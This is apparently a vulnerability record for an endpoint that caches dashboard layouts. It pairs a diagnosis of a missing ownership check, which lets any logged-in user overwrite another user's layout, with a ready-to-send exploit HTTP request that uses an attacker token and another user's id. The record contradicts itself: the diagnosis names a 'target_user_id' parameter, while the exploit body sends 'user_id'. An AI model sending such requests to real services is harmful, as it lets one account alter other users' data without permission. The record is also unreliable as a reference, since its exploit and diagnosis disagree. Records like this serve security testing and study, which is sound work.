diagnosis: The view updates cached UI layout configurations using target_user_id supplied in the request body without checking if target_user_id matches request.user.id. Any authenticated user can overwrite another user's dashboard layout or inject invalid layout parameters causing UI rendering errors.
exploit_request:
POST /api/dashboard/cache-layout/ HTTP/1.1
Host: portal.cloud.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"user_id": 412, "layout": {"widgets": []}}
